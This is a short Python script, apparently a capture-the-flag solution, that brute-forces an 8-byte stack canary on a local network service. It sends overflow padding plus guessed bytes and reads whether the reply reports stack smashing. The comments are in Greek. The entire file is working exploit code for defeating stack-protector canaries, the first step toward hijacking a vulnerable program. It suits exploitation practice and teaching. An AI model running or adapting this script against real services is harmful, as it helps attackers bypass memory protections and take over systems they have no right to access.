import socket
import time

def solve():
    host, port = '127.0.0.1', 28285
    padding = b"A" * 122
    known_canary = b""

    print("--- Starting Robust Brute-force (8 bytes) ---")

    for i in range(8):
        print(f"Searching for byte {i}...", end=" ", flush=True)
        found = False
        for candidate in range(256):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5) # Αυξημένο timeout
                s.connect((host, port))
                
                payload = padding + known_canary + bytes([candidate])
                s.sendall(payload)
                
                try:
                    data = s.recv(1024)
                except socket.timeout:
                    data = b"timeout" # Θεωρούμε το timeout ως αποτυχία
                
                s.close()

                # ΠΡΟΣΟΧΗ: Πρέπει η απάντηση να ΜΗΝ έχει το smashing 
                # ΑΛΛΑ να έχει την κανονική έξοδο του προγράμματος (π.χ. το "Twit:")
                if data != b"timeout" and b"Stack smashing detected" not in data:
                    known_canary += bytes([candidate])
                    print(f"Found: {hex(candidate)}")
                    found = True
                    break
            except:
                time.sleep(0.01) # Μικρή ανάσα για το socket
                continue
        
        if not found:
            print("\n[!] Failed to find byte. Server might be rate-limiting.")
            break

    print(f"\nFINAL_CANARY: {known_canary.hex()}")

if __name__ == "__main__":
    solve()